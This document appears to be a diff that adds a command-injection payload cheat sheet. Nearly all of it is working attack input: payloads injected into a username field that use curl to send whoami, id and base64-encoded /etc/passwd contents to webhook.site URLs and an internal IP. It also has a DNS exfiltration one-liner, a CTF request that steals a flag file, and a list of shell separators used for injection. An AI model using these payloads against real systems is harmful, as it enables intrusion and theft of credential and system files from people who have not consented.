@@ -1,0 +1,39 @@
+username=pooploot;curl+https://webhook.site/e19c95f0-cbf5-48ee-932f-3f588ca36246/class
+---------------
+username=pooploot;curl+https://webhook.site/e19c95f0-cbf5-48ee-932f-3f588ca36246/`whoami`
+---------------
+username=pooploot;curl+https://webhook.site/e19c95f0-cbf5-48ee-932f-3f588ca36246/`id`
+-----------------
+username=pooploot;curl+https://webhook.site/e19c95f0-cbf5-48ee-932f-3f588ca36246/`id|base64`
+-----------------
+username=root;curl+https://webhook.site/e19c95f0-cbf5-48ee-932f-3f588ca36246/`head+-1+/etc/passwd|base64`
+-----------------
+username=root;`cat+/etc/passwd|base64+-w+25|while+read+x;do+curl+http://192.168.40.99:81/$x;done`
+
+
+
+DNS exfiltration
+# a=$(head -1 /etc/passwd|base64);host $a.kiki.com
+
+
+###  CTF 
+GET /blind.php?domain=cdac.in;curl+https://webhook.site/d7ee1783-2ace-4702-8fc6-3a3f320b4c3b/`cat+/flag/win.txt+|+base64` HTTP/1.1
+
+
+
+
+
+
+
+
+
+|cmd
+__
+&& cmd
+& cmd
+$(cmd)
+(cmd)
+`cmd`
+; cmd
+|| cmd
+_________
